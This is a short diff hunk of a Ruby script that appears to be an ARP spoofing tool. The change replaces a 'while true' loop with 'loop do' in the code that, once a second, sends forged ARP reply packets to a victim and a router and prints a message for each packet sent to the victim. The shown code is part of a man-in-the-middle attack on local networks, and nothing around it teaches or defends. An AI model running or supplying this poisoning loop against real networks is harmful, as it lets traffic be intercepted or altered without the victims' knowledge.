@@ -75,7 +75,7 @@ arp_packet_router.arp_daddr_ip = router_ip
 arp_packet_router.arp_opcode = 2 
 
 
-while true
+loop do
   sleep	1
   puts	"[+]	Sending	ARP	packet	to	victim:	#{arp_packet_victim.arp_daddr_ip}".red
   arp_packet_victim.to_w(info[:iface])
